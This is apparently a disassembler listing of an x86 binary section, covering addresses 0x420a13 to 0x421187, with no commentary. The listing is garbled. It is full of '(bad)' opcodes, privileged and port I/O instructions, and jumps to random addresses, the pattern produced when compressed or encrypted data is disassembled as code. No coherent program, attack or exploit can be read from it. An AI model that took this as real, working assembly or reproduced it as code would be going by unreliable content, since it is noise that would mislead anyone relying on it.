  420a13:	loopne 0x420a75
  420a15:	imul   ecx,DWORD PTR [edi-0x72e3248d],0xffffffb0
  420a1c:	test   eax,0x6d1e0eaa
  420a21:	(bad)  
  420a22:	shl    DWORD PTR [ebx-0x6b],0x1f
  420a26:	mov    al,0x83
  420a28:	dec    esp
  420a29:	loopne 0x420a77
  420a2b:	pop    edi
  420a2c:	stos   DWORD PTR es:[edi],eax
  420a2d:	nop
  420a2e:	mov    bh,bl
  420a30:	fwait
  420a31:	jge    0x420a58
  420a33:	lds    eax,FWORD PTR [ecx+0x54a2e7eb]
  420a39:	rcl    BYTE PTR [ebx+eiz*4],cl
  420a3c:	jg     0x4209f9
  420a3e:	sti    
  420a3f:	sbb    esp,DWORD PTR [esi+ecx*4+0x39]
  420a43:	mov    bl,0x3f
  420a45:	(bad)
  420a48:	pop    edx
  420a49:	sbb    BYTE PTR [esi],0x97
  420a4c:	mov    ds:0xd3d7488d,al
  420a51:	or     ebp,DWORD PTR [ebx+0x56]
  420a54:	dec    esi
  420a55:	cmp    eax,0x6cdebbc0
  420a5a:	fmul   st(4),st
  420a5c:	adc    DWORD PTR [edx],0x386eca2a
  420a62:	popf   
  420a63:	mov    al,BYTE PTR [esi]
  420a65:	out    0xd6,al
  420a67:	mov    WORD PTR [eax+0x4f2dbe7d],es
  420a6d:	ja     0x4209f9
  420a6f:	lods   eax,DWORD PTR ds:[esi]
  420a70:	data16 in al,dx
  420a72:	jl     0x420a73
  420a74:	cmp    al,0xa
  420a76:	xchg   ebx,eax
  420a77:	xor    ch,BYTE PTR [ebp+0x22]
  420a7a:	lahf   
  420a7b:	loop   0x420a00
  420a7d:	loop   0x420ad5
  420a7f:	jbe    0x420a0a
  420a81:	jp     0x420a04
  420a83:	rol    DWORD PTR [edi+ebp*2-0x2215a933],cl
  420a8a:	inc    DWORD PTR [ebx+0x64]
  420a8d:	jg     0x420acd
  420a8f:	lea    esi,[ebx+edi*1-0x51fc95bc]
  420a96:	pop    ss
  420a97:	hlt    
  420a98:	inc    esp
  420a99:	ret    
  420a9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a9b:	or     al,0xd7
  420a9d:	mov    esp,0x5e024f20
  420aa2:	pop    esp
  420aa3:	or     DWORD PTR [edx-0x34],eax
  420aa6:	in     eax,0x86
  420aa8:	push   ecx
  420aa9:	and    eax,0x3aade932
  420aae:	sbb    edi,DWORD PTR [eax+0x5f7c6fa]
  420ab4:	cdq    
  420ab5:	and    ch,bh
  420ab7:	mov    BYTE PTR [esi],ah
  420ab9:	xchg   DWORD PTR [esi-0xd],ecx
  420abc:	xor    al,0xd
  420abe:	shl    BYTE PTR [edi-0x1844536a],cl
  420ac4:	dec    edi
  420ac5:	sub    DWORD PTR [esi+0x3a5710f3],esp
  420acb:	ret    
  420acc:	sbb    esp,DWORD PTR ds:0x5c381a76
  420ad2:	test   BYTE PTR [edi+0x18],bl
  420ad5:	(bad)  
  420ad6:	pop    esp
  420ad7:	pop    es
  420ad8:	xchg   ebx,eax
  420ad9:	into   
  420ada:	out    0xf0,al
  420adc:	psrlq  mm2,QWORD PTR [esi-0x5832db72]
  420ae3:	int    0x4a
  420ae5:	(bad)  
  420ae7:	jmp    0x420b0a
  420ae9:	jnp    0x420afa
  420aeb:	jnp    0x420a80
  420aed:	mov    esp,0xb943d1dd
  420af2:	mov    bl,0xe
  420af4:	into   
  420af5:	jnp    0x420a7b
  420af7:	lea    ebp,[edx]
  420af9:	das    
  420afa:	dec    eax
  420afb:	xchg   esp,eax
  420afc:	arpl   WORD PTR [ebx+0x4e],cx
  420aff:	stc    
  420b00:	push   edx
  420b01:	and    DWORD PTR [eax],ebx
  420b03:	sub    ah,0xc7
  420b06:	sbb    edi,esi
  420b08:	mul    DWORD PTR [edi+0x6a]
  420b0b:	jmp    0x64a0dfa5
  420b10:	rol    ebx,cl
  420b12:	sub    al,0x85
  420b14:	dec    esi
  420b15:	jg     0x420a98
  420b17:	mov    DWORD PTR [esi+0x20],edx
  420b1a:	mov    edi,0xcdfaae4
  420b1f:	add    BYTE PTR [esi+0xffa4482],ch
  420b25:	js     0x420b52
  420b27:	ja     0x420ba6
  420b29:	(bad)  
  420b2a:	push   ebx
  420b2b:	loop   0x420b33
  420b2d:	jl     0x420b67
  420b2f:	cmp    bh,BYTE PTR [eax-0x68]
  420b32:	call   0xdeb01480
  420b37:	inc    ebx
  420b38:	cmc    
  420b39:	into   
  420b3a:	cwde   
  420b3b:	cmp    esp,ebx
  420b3d:	mov    BYTE PTR [ebx+edi*1],bl
  420b40:	mov    eax,0xed49f72
  420b45:	call   0x5a65d09e
  420b4a:	or     eax,0x1d7e480
  420b4f:	ss loop 0x420bbd
  420b52:	xor    dh,BYTE PTR [ebx+esi*2-0x67]
  420b56:	pop    ebp
  420b57:	xchg   ebx,edx
  420b59:	xor    BYTE PTR [edi+0x69f7635c],0x7
  420b60:	popf   
  420b61:	loop   0x420bbc
  420b63:	dec    esp
  420b64:	add    esp,DWORD PTR [edx+ebx*2+0x70ad8dc4]
  420b6b:	cli    
  420b6c:	cmp    eax,ebp
  420b6e:	pop    esp
  420b6f:	loopne 0x420b75
  420b71:	ret    
  420b72:	retf   0x3e46
  420b75:	mov    BYTE PTR [ebx-0x21ee34fa],ch
  420b7b:	sbb    ch,cl
  420b7d:	out    0x7a,al
  420b7f:	pop    esp
  420b80:	and    eax,DWORD PTR [edx+ebx*2]
  420b83:	jp     0x420b6e
  420b85:	js     0x420bb5
  420b87:	gs dec ebx
  420b89:	test   eax,ebx
  420b8b:	fist   WORD PTR [edi-0x1e]
  420b8e:	sub    esp,esp
  420b90:	push   edi
  420b91:	push   edi
  420b92:	mov    bh,0x77
  420b94:	push   esp
  420b95:	jno    0x420b63
  420b97:	push   ecx
  420b98:	fisub  WORD PTR [edi]
  420b9a:	fcmovnu st,st(4)
  420b9c:	fistp  DWORD PTR [esi+0x645198a6]
  420ba2:	dec    ebp
  420ba3:	fcomp  DWORD PTR [edx]
  420ba5:	das    
  420ba6:	div    DWORD PTR [edx]
  420ba8:	lods   al,BYTE PTR ds:[esi]
  420ba9:	mov    ah,0xaf
  420bab:	add    esp,DWORD PTR [ebp+0x761d2f56]
  420bb1:	add    al,0xad
  420bb3:	mov    al,ds:0x5e6f1302
  420bb8:	fidivr WORD PTR [edx-0x41]
  420bbb:	adc    esi,DWORD PTR [ebx+0x34]
  420bbe:	out    dx,al
  420bbf:	mov    ds:0xf046c24c,eax
  420bc4:	imul   edx,edi,0xffffff8b
  420bc7:	loope  0x420b67
  420bc9:	or     esp,DWORD PTR [eax-0x33]
  420bcc:	leave  
  420bcd:	shr    bh,cl
  420bcf:	push   esi
  420bd0:	mov    esp,0x888fec10
  420bd5:	adc    DWORD PTR [eax-0x7a],0xffffffc8
  420bd9:	jo     0x420c4d
  420bdb:	fsubr  QWORD PTR [ebx+0x32]
  420bde:	jbe    0x420c22
  420be0:	pop    ss
  420be1:	imul   esp,esi,0xffffffc0
  420be4:	sbb    al,0xaf
  420be6:	dec    ebp
  420be7:	es aad 0x3c
  420bea:	pusha  
  420beb:	sysret 
  420bed:	xlat   BYTE PTR ds:[ebx]
  420bee:	pop    es
  420bef:	jno    0x420c1a
  420bf1:	push   cs
  420bf2:	leave  
  420bf3:	(bad)  
  420bf4:	mov    al,0x62
  420bf6:	out    dx,eax
  420bf7:	adc    BYTE PTR [ebx-0x49fde57a],cl
  420bfd:	ret    
  420bfe:	jb     0x420b9b
  420c00:	inc    ebp
  420c01:	xchg   BYTE PTR [edx+0x17],bl
  420c04:	push   ds
  420c05:	sbb    esi,0x13
  420c08:	leave  
  420c09:	mov    cl,0x64
  420c0b:	pop    ebp
  420c0c:	stc    
  420c0d:	jo     0x420c6b
  420c0f:	xor    BYTE PTR [ebp-0x23],0x43
  420c13:	push   edi
  420c14:	in     eax,dx
  420c15:	(bad)  
  420c16:	cmp    esi,DWORD PTR [edx+0x73b4e8d8]
  420c1c:	add    eax,0x2e1dd977
  420c21:	(bad)  
  420c23:	stos   DWORD PTR es:[edi],eax
  420c24:	lods   al,BYTE PTR ds:[esi]
  420c25:	in     al,0x74
  420c27:	inc    ebp
  420c28:	dec    edx
  420c29:	retf   0xcf8b
  420c2c:	js     0x420be4
  420c2e:	leave  
  420c2f:	inc    esp
  420c30:	add    eax,0x72fb3e09
  420c35:	and    esi,edx
  420c37:	jne    0x420c91
  420c39:	jo     0x420bcd
  420c3b:	pop    esp
  420c3c:	push   0x1
  420c3e:	imul   esp,DWORD PTR [edx-0x5aae2184],0xffffffef
  420c45:	xchg   ecx,eax
  420c46:	ss sub cl,dl
  420c49:	xor    eax,0x5ec78e25
  420c4e:	iret   
  420c4f:	mov    dl,0x8
  420c51:	jns    0x420c76
  420c53:	jle    0x420c3d
  420c55:	pop    ds
  420c56:	cmp    bh,BYTE PTR [esi]
  420c58:	or     cl,ah
  420c5a:	and    DWORD PTR [ebx-0x76],edi
  420c5d:	jae    0x420ca1
  420c5f:	sbb    DWORD PTR [esi],esi
  420c61:	ds mov eax,0xc56fefa
  420c67:	inc    eax
  420c68:	pusha  
  420c69:	xchg   ecx,eax
  420c6a:	imul   edi,DWORD PTR [ebx-0x5],0xe764b5df
  420c71:	lods   al,BYTE PTR ds:[esi]
  420c72:	lods   eax,DWORD PTR ds:[esi]
  420c73:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c74:	dec    edi
  420c75:	add    eax,0xc5591e6
  420c7a:	and    edi,esp
  420c7c:	aas    
  420c7d:	dec    edi
  420c7e:	jne    0x420c28
  420c80:	out    0xc5,al
  420c82:	cmp    BYTE PTR [ebp-0x10c48d4f],dh
  420c88:	push   0x3b
  420c8a:	jns    0x420cab
  420c8c:	sub    BYTE PTR [ecx-0x1],bh
  420c8f:	inc    eax
  420c90:	xor    esi,eax
  420c92:	xchg   BYTE PTR [eax+0x5],bl
  420c95:	jo     0x420cf5
  420c97:	xchg   BYTE PTR [ecx+0x482884f0],ch
  420c9d:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  420c9f:	push   ebp
  420ca0:	ins    DWORD PTR es:[edi],dx
  420ca1:	xchg   ebp,eax
  420ca2:	mov    esp,0xd2b48026
  420ca7:	cdq    
  420ca8:	scas   eax,DWORD PTR es:[edi]
  420ca9:	aaa    
  420caa:	inc    edi
  420cab:	add    BYTE PTR [ecx],dl
  420cad:	seto   BYTE PTR [edx+0x64]
  420cb1:	adc    DWORD PTR [esi+0x172094f],ebx
  420cb7:	add    al,BYTE PTR [edx-0x6e]
  420cba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420cbb:	mov    ss,WORD PTR [edi]
  420cbd:	outs   dx,BYTE PTR ds:[esi]
  420cbe:	cmp    BYTE PTR [esi+0x45],ch
  420cc1:	rcl    BYTE PTR [ebp-0x65],1
  420cc4:	or     DWORD PTR [ebx],0x4
  420cc7:	push   ebx
  420cc8:	int    0xc9
  420cca:	sbb    eax,0x8562d5e1
  420ccf:	xchg   edx,eax
  420cd0:	mov    ah,0x9d
  420cd2:	outs   dx,BYTE PTR ds:[esi]
  420cd3:	xor    al,ah
  420cd5:	rcr    DWORD PTR es:[ebp+0x39],0x99
  420cda:	mov    al,ds:0xa883032
  420cdf:	sbb    eax,0xf626d1b8
  420ce4:	sahf   
  420ce5:	jae    0x420d59
  420ce7:	repnz push 0xffffffa9
  420cea:	jbe    0x420cf6
  420cec:	xchg   ebx,eax
  420ced:	jp     0x420d55
  420cef:	cs push ebx
  420cf1:	pop    es
  420cf2:	(bad)  
  420cf3:	and    BYTE PTR [eax],bh
  420cf5:	add    al,0x54
  420cf7:	pop    es
  420cf8:	aam    0xa6
  420cfa:	sbb    DWORD PTR [edx+0xd2054db],esi
  420d00:	lock or ebx,DWORD PTR [ebp+eiz*2+0x1bda906d]
  420d08:	jecxz  0x420d30
  420d0a:	cmp    al,0x1f
  420d0c:	mov    ds:0xe3274e6b,al
  420d11:	add    eax,0x7205af0b
  420d16:	and    BYTE PTR es:[ecx+0x66],dh
  420d1a:	pop    esi
  420d1b:	test   al,0xbf
  420d1d:	js     0x420cd6
  420d1f:	sub    eax,0xba0446de
  420d24:	(bad)  
  420d25:	cmp    al,0x73
  420d27:	jmp    0x420d02
  420d29:	mov    ah,0xd8
  420d2b:	sub    esp,DWORD PTR [edi]
  420d2d:	retf   
  420d2e:	out    0x24,al
  420d30:	sti    
  420d31:	adc    eax,DWORD PTR [ebp+0x2844d28]
  420d37:	inc    ecx
  420d38:	cli    
  420d39:	daa    
  420d3a:	out    0xd4,eax
  420d3c:	mov    esp,0x160c8c0f
  420d41:	fild   QWORD PTR [edi+0x2676273e]
  420d47:	add    eax,0x6b4dd4f4
  420d4c:	cld    
  420d4d:	ins    DWORD PTR es:[edi],dx
  420d4e:	mov    ds:0xda306c33,eax
  420d53:	stos   BYTE PTR es:[edi],al
  420d54:	aad    0x41
  420d56:	ret    0xd510
  420d59:	sti    
  420d5a:	fistp  DWORD PTR [edx+0x3c]
  420d5d:	push   eax
  420d5e:	je     0x420d54
  420d60:	pop    edx
  420d62:	repz inc ecx
  420d64:	sbb    BYTE PTR [eax],dl
  420d66:	mov    ecx,0xbd2fdaa4
  420d6b:	call   0xc301467f
  420d70:	sahf   
  420d71:	cwde   
  420d72:	mov    edi,0xfa6f1f29
  420d77:	jb     0x420d05
  420d79:	rcr    BYTE PTR [ebx],cl
  420d7b:	push   cs
  420d7c:	push   esi
  420d7d:	mov    al,0x26
  420d7f:	mov    dh,0x7
  420d81:	push   ebp
  420d82:	or     eax,0xbcd68187
  420d87:	mov    dl,0xec
  420d89:	arpl   WORD PTR [ebp-0x79],dx
  420d8c:	(bad)  
  420d8d:	(bad)  
  420d8f:	(bad)  
  420d90:	jl     0x420d29
  420d92:	sbb    eax,eax
  420d94:	inc    esp
  420d95:	enter  0xf31e,0x6
  420d99:	(bad)  
  420d9a:	jne    0x420db6
  420d9c:	inc    ebp
  420d9d:	xchg   edi,eax
  420d9e:	icebp  
  420d9f:	adc    BYTE PTR [ecx-0x62d17ca4],dh
  420da5:	stc    
  420da6:	fisub  DWORD PTR [ebp-0x6de5a01a]
  420dac:	add    ah,BYTE PTR [edx-0x3]
  420daf:	jge    0x420dd8
  420db1:	push   0xbabe1ed8
  420db6:	add    DWORD PTR [ecx],0xb4c772c8
  420dbc:	fistp  QWORD PTR [ecx]
  420dbe:	push   edx
  420dbf:	and    BYTE PTR [edi-0x3f6c024c],0x2e
  420dc6:	jns    0x420d71
  420dc8:	cmp    esi,DWORD PTR [ecx-0xe74a48a]
  420dce:	rcr    BYTE PTR [ebp+0x7f8ac2cb],1
  420dd4:	je     0x420d99
  420dd6:	inc    eax
  420dd7:	jp     0x420d69
  420dd9:	mov    ah,0x86
  420ddb:	inc    ecx
  420ddc:	adc    bl,BYTE PTR ds:0xbf8c108b
  420de2:	pop    es
  420de3:	or     dl,dh
  420de5:	ret    0xab53
  420de8:	mov    al,ds:0x517d8169
  420ded:	ret    0xd990
  420df0:	scas   al,BYTE PTR es:[edi]
  420df1:	ins    BYTE PTR es:[edi],dx
  420df2:	fwait
  420df3:	jecxz  0x420e0b
  420df5:	test   al,0x5d
  420df7:	push   ecx
  420df8:	gs jb  0x420d8d
  420dfb:	add    eax,0x1c60c63c
  420e00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e01:	je     0x420e52
  420e03:	inc    eax
  420e04:	sub    eax,0x4553f07f
  420e09:	or     BYTE PTR [ecx-0x43ee418b],cl
  420e0f:	and    al,0x6a
  420e11:	push   ss
  420e12:	hlt    
  420e13:	outs   dx,BYTE PTR ds:[esi]
  420e14:	shl    ecx,1
  420e16:	sub    al,0xa
  420e18:	in     eax,0xdf
  420e1a:	inc    ebp
  420e1b:	imul   BYTE PTR [eax+ebp*8+0x1d]
  420e1f:	not    DWORD PTR [ebx]
  420e21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e22:	dec    ebp
  420e23:	mov    al,0xda
  420e25:	bound  esp,QWORD PTR ds:0x4fab5a6d
  420e2b:	or     ebx,ecx
  420e2d:	dec    esi
  420e2e:	mov    ds:0xd75903c0,eax
  420e33:	mov    WORD PTR [ecx-0x728dab0b],gs
  420e39:	cdq    
  420e3a:	inc    esi
  420e3b:	mov    edi,DWORD PTR [ecx+edx*1]
  420e3e:	jb     0x420eb1
  420e40:	js     0x420e18
  420e42:	xor    BYTE PTR gs:[eax+0x16aa5312],0xe0
  420e4a:	cli    
  420e4b:	outs   dx,BYTE PTR ds:[esi]
  420e4c:	aas    
  420e4d:	pop    ecx
  420e4e:	xor    DWORD PTR [ebp+0x51],ecx
  420e51:	sub    DWORD PTR [edx-0x75e9300d],edx
  420e57:	popf   
  420e58:	or     al,0x85
  420e5a:	pop    esp
  420e5b:	(bad)  [ecx-0x3acc0e62]
  420e61:	sbb    edx,DWORD PTR [ecx+0x661e25d7]
  420e67:	xor    DWORD PTR [edi+ebp*2-0x191bcc6b],ecx
  420e6e:	xchg   DWORD PTR [esi],ebx
  420e70:	(bad)  
  420e71:	int3   
  420e72:	imul   ebp,DWORD PTR [edx-0x5d],0x27a8ff98
  420e79:	mov    edx,0xefef5446
  420e7e:	pop    ebp
  420e7f:	jbe    0x420ebf
  420e81:	xor    cl,ah
  420e83:	mov    BYTE PTR [ebx+0x4b],bl
  420e86:	or     esp,eax
  420e88:	aas    
  420e89:	popf   
  420e8a:	jo     0x420e7b
  420e8c:	sti    
  420e8d:	(bad)  
  420e8e:	jmp    0x420e56
  420e90:	pop    ds
  420e91:	or     BYTE PTR [edi-0x65],cl
  420e94:	dec    esp
  420e95:	dec    eax
  420e96:	fistp  WORD PTR [ebp-0x7c]
  420e99:	addr16 xchg ebx,eax
  420e9b:	sub    ch,BYTE PTR [edx+0x2f3e7186]
  420ea1:	out    dx,eax
  420ea2:	xchg   edi,eax
  420ea3:	cmp    ebp,esp
  420ea5:	cwde   
  420ea6:	xor    esi,ebx
  420ea8:	mov    edx,0x22ff84f2
  420ead:	push   esp
  420eae:	mov    ss,ebx
  420eb0:	data16 adc al,bh
  420eb3:	sub    BYTE PTR [edx-0x55],bh
  420eb6:	push   ss
  420eb7:	sbb    cl,BYTE PTR [ebx-0x58]
  420eba:	push   es
  420ebb:	aad    0x1
  420ebd:	mov    ch,BYTE PTR [ecx]
  420ebf:	inc    eax
  420ec0:	jns    0x420e6d
  420ec2:	stos   DWORD PTR es:[edi],eax
  420ec3:	xchg   edi,eax
  420ec4:	jnp    0x420ea0
  420ec6:	sub    BYTE PTR [ecx+0x4b],ah
  420ec9:	xchg   ebp,eax
  420eca:	(bad)  
  420ecb:	push   edx
  420ecc:	fs mov edx,0x7582fab8
  420ed2:	dec    ecx
  420ed3:	dec    ebx
  420ed4:	scas   eax,DWORD PTR es:[edi]
  420ed5:	jl     0x420f02
  420ed7:	xchg   DWORD PTR [eax+0x14ecbd51],ebx
  420edd:	std    
  420ede:	xchg   esp,eax
  420edf:	or     BYTE PTR [eax],cl
  420ee1:	mov    esi,0xb3566634
  420ee6:	(bad)  
  420ee8:	jecxz  0x420e8b
  420eea:	mov    edi,0x79927928
  420eef:	dec    edi
  420ef0:	dec    edx
  420ef1:	jbe    0x420ebb
  420ef3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ef4:	sbb    eax,0xdb3dbfb4
  420ef9:	addr16 cdq 
  420efb:	jbe    0x420ee3
  420efd:	cmp    BYTE PTR [eax],cl
  420eff:	jl     0x420f1d
  420f01:	and    ebx,edx
  420f03:	pop    es
  420f04:	hlt    
  420f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f06:	pop    ss
  420f07:	nop
  420f08:	xor    al,0x47
  420f0a:	jb     0x420eb3
  420f0c:	xchg   BYTE PTR [edx+0x51558ac3],bl
  420f12:	pop    ss
  420f13:	or     dl,ch
  420f15:	jmp    0x420f75
  420f17:	adc    ebx,ebx
  420f19:	lock (bad) 
  420f1b:	pop    eax
  420f1c:	fldenv [edi+ebp*2-0x34]
  420f20:	cmp    eax,0xbd332673
  420f25:	je     0x420f34
  420f27:	jl     0x420ee2
  420f29:	push   edx
  420f2a:	sti    
  420f2b:	repnz cmc 
  420f2d:	jns    0x420ee5
  420f2f:	hlt    
  420f30:	in     al,dx
  420f31:	add    ebp,esi
  420f33:	(bad)  
  420f34:	loope  0x420f92
  420f36:	mov    esi,0xbbba9e20
  420f3b:	lahf   
  420f3c:	xchg   esp,eax
  420f3d:	mov    edx,ss
  420f3f:	out    dx,eax
  420f40:	ret    0x8363
  420f43:	stos   BYTE PTR es:[edi],al
  420f44:	inc    edx
  420f45:	repnz adc BYTE PTR [eax+esi*4+0x3dbff09],ch
  420f4d:	sub    DWORD PTR [eax+0x47627568],0x55
  420f54:	mov    ch,0x68
  420f56:	mov    esi,DWORD PTR ds:0x50f6ca92
  420f5c:	aas    
  420f5d:	pop    esp
  420f5e:	das    
  420f5f:	mov    dh,0xea
  420f61:	dec    edx
  420f62:	adc    al,0xa6
  420f64:	pop    eax
  420f65:	das    
  420f66:	jg     0x420f26
  420f68:	imul   esp,eax,0x61
  420f6b:	mov    bl,0xe7
  420f6d:	sbb    ah,0xce
  420f70:	mov    ch,0x27
  420f72:	aam    0x4f
  420f74:	sub    al,0xb9
  420f76:	pushf  
  420f77:	cld    
  420f78:	cmp    dl,BYTE PTR [esi+edi*2+0x2e7ac8fc]
  420f7f:	dec    edi
  420f80:	and    edi,ebx
  420f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f83:	in     al,dx
  420f84:	jg     0x420f32
  420f86:	add    eax,DWORD PTR [eax+0xd06f4dd]
  420f8c:	imul   DWORD PTR [ebx]
  420f8e:	dec    eax
  420f8f:	iret   
  420f90:	push   ecx
  420f91:	adc    DWORD PTR [ebp-0x46046787],0xc5806144
  420f9b:	stc    
  420f9c:	neg    DWORD PTR [ebp-0x57fc055d]
  420fa2:	pop    esi
  420fa3:	fcmovu st,st(2)
  420fa5:	imul   edi,DWORD PTR [edi-0x80],0x7b
  420fa9:	leave  
  420faa:	jns    0x420f85
  420fac:	fdiv   DWORD PTR [ebp+0x1a2c4d96]
  420fb2:	inc    edi
  420fb3:	leave  
  420fb4:	mov    ds:0x67d20e3b,eax
  420fb9:	mov    dl,0xcf
  420fbb:	push   es
  420fbc:	push   0x47
  420fbe:	pop    edi
  420fbf:	ret    0x66d4
  420fc2:	sbb    eax,0x564f4a59
  420fc7:	jno    0x420f5f
  420fc9:	pop    edx
  420fca:	xchg   esi,eax
  420fcb:	lea    ebp,[edi-0x4b]
  420fce:	jge    0x420f5f
  420fd0:	jae    0x420f9e
  420fd2:	neg    BYTE PTR [esi+0x4a]
  420fd5:	xor    eax,0x659247b3
  420fda:	xchg   DWORD PTR [esi+eax*1+0x49c84aa8],eax
  420fe1:	test   edi,esi
  420fe3:	lods   eax,DWORD PTR ds:[esi]
  420fe4:	cmp    dl,BYTE PTR [eax-0x7ac2fc16]
  420fea:	or     dl,bl
  420fec:	sub    BYTE PTR [esi+0x30],ch
  420fef:	dec    esp
  420ff0:	sti    
  420ff1:	ror    DWORD PTR [eax+0x709df101],0x59
  420ff8:	test   BYTE PTR [esi],bl
  420ffa:	dec    ebx
  420ffb:	inc    esi
  420ffc:	xchg   ebx,eax
  420ffd:	(bad)  
  420ffe:	ins    DWORD PTR es:[edi],dx
  420fff:	(bad)  
  421000:	aam    0xd9
  421002:	lock jno 0x42103d
  421005:	ja     0x421014
  421007:	xchg   ecx,eax
  421008:	push   edx
  421009:	inc    eax
  42100a:	sub    DWORD PTR [eax-0xd],0xffffff9f
  42100e:	inc    eax
  42100f:	call   0xdb52bd11
  421014:	mov    cl,0x90
  421016:	fdiv   st(6),st
  421018:	xchg   ecx,eax
  421019:	in     al,0x7e
  42101b:	mov    edx,0x98dac744
  421020:	iret   
  421021:	in     al,dx
  421022:	cwde   
  421023:	sub    ecx,DWORD PTR [esi]
  421025:	cmp    edx,DWORD PTR [ebp+0x75]
  421028:	jmp    0xe4f4:0xc025842a
  42102f:	xor    eax,0x567866dd
  421034:	test   BYTE PTR [edi-0x37],bl
  421037:	pop    eax
  421038:	inc    edi
  421039:	push   es
  42103a:	jl     0x421029
  42103c:	shr    DWORD PTR [ecx],0x73
  42103f:	fild   WORD PTR [edx]
  421041:	sbb    eax,0xf8bbcadc
  421046:	or     al,0xec
  421048:	jne    0x421057
  42104a:	adc    DWORD PTR [edi],0x56
  42104d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42104e:	mov    esi,0x3a2e5c92
  421053:	jp     0x421015
  421055:	jmp    0xc0d6473a
  42105a:	cli    
  42105b:	(bad)  
  42105c:	lahf   
  42105d:	mov    esp,0x7ba49e61
  421062:	adc    ecx,DWORD PTR [eax]
  421064:	mov    ebp,0x9588b169
  421069:	mov    edx,0xf483c9a8
  42106e:	cld    
  42106f:	or     ecx,DWORD PTR [ebx]
  421071:	jmp    0xbba0b8b6
  421076:	loope  0x421091
  421078:	push   ecx
  421079:	mov    edi,0xf0620f06
  42107e:	daa    
  42107f:	cli    
  421080:	mov    eax,0xcbb9a40d
  421085:	hlt    
  421086:	inc    ebp
  421087:	in     eax,0x7c
  421089:	mov    ecx,0x9b82770d
  42108e:	pop    eax
  42108f:	adc    bl,BYTE PTR [ebp+0xf154b30]
  421095:	adc    ch,ah
  421097:	popa   
  421098:	mov    edx,0x51db5dae
  42109d:	xor    dh,ch
  42109f:	test   al,0xb7
  4210a1:	mov    ah,0x7f
  4210a3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210a4:	loopne 0x421028
  4210a6:	imul   esi,DWORD PTR [eax-0x3],0xffffffcd
  4210aa:	neg    BYTE PTR ds:0x218a346f
  4210b0:	push   ebx
  4210b1:	daa    
  4210b2:	xchg   edx,eax
  4210b3:	out    dx,al
  4210b4:	imul   eax,ebp,0x577ed780
  4210ba:	leave  
  4210bb:	sub    eax,0xc61b9b3c
  4210c0:	stos   BYTE PTR es:[edi],al
  4210c1:	xchg   esi,eax
  4210c2:	cdq    
  4210c3:	sti    
  4210c4:	push   esp
  4210c5:	pop    eax
  4210c6:	adc    al,0x3a
  4210c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210c9:	jae    0x4210e0
  4210cb:	imul   edx,DWORD PTR [esi],0x773070b6
  4210d1:	test   BYTE PTR [ecx-0x9],0x25
  4210d5:	pop    ds
  4210d6:	ss pop es
  4210d8:	(bad)  
  4210d9:	cmp    al,BYTE PTR [esi+0x1e1af119]
  4210df:	mov    dl,0xd7
  4210e1:	daa    
  4210e2:	mov    gs,esi
  4210e4:	fnsave [ebp+0x6e1fd5b4]
  4210ea:	(bad)  
  4210eb:	fidivr WORD PTR ss:[edx+0x71]
  4210ef:	dec    edx
  4210f0:	cmp    bh,cl
  4210f2:	iret   
  4210f3:	push   cs
  4210f4:	jmp    0x421141
  4210f6:	ret    
  4210f7:	jecxz  0x421098
  4210f9:	xchg   esp,eax
  4210fa:	loopne 0x421162
  4210fc:	pop    ebx
  4210fd:	push   esp
  4210fe:	cmp    al,0xc
  421100:	iret   
  421101:	dec    esi
  421102:	mov    al,ds:0xfb35268c
  421107:	jp     0x4210fa
  421109:	sub    al,0x44
  42110b:	pop    edx
  42110c:	push   cs
  42110d:	pop    ecx
  42110e:	or     edx,DWORD PTR [ebx]
  421110:	mov    edi,0xdec5b90a
  421115:	pop    ebp
  421116:	inc    ebp
  421117:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421118:	dec    edi
  421119:	ss push ecx
  42111b:	daa    
  42111c:	fisttp WORD PTR [ebx-0x2c26168b]
  421122:	les    eax,FWORD PTR [ecx+0x3d]
  421125:	mov    esi,0x92c58628
  42112a:	xchg   ebx,eax
  42112b:	add    al,0x9
  42112d:	stos   BYTE PTR es:[edi],al
  42112e:	jbe    0x421111
  421130:	es pop es
  421132:	adc    ecx,edx
  421134:	cmp    DWORD PTR [edx],ebp
  421136:	retf   0x68c7
  421139:	ss push ebx
  42113b:	dec    esi
  42113c:	(bad)  
  42113d:	leave  
  42113e:	jnp    0x4211bc
  421140:	ins    DWORD PTR es:[edi],dx
  421141:	fistp  WORD PTR [ebx+0x5a]
  421144:	iret   
  421145:	bound  edi,QWORD PTR [edx]
  421147:	and    bh,ch
  421149:	push   ss
  42114a:	sahf   
  42114b:	and    edx,DWORD PTR [ecx]
  42114d:	aam    0x1f
  42114f:	xchg   ebp,eax
  421150:	mov    dh,0xee
  421152:	cvttps2pi mm1,QWORD PTR [eax+0x3c]
  421156:	push   ebp
  421157:	xor    al,BYTE PTR [ebx-0x15]
  42115a:	pop    ebx
  42115b:	push   edi
  42115c:	push   edx
  42115d:	xchg   ebx,eax
  42115e:	xchg   ebp,eax
  42115f:	(bad)  
  421160:	ds in  eax,dx
  421162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421163:	mov    ch,0xa7
  421165:	stos   DWORD PTR es:[edi],eax
  421166:	dec    ebx
  421167:	test   eax,0x79a0b441
  42116c:	test   DWORD PTR [eax],ecx
  42116e:	push   esi
  42116f:	inc    esi
  421170:	pushf  
  421171:	mov    ebx,0xfc2feef1
  421176:	stos   DWORD PTR es:[edi],eax
  421177:	dec    ebx
  421178:	out    0xc2,ax
  42117b:	dec    esp
  42117c:	sub    BYTE PTR [ebp+0x6a18654f],bh
  421182:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421183:	pusha  
  421184:	lods   al,BYTE PTR ds:[esi]
  421185:	daa    
  421186:	dec    esi
  421187:	mul    DWORD PTR [ebp-0x20]
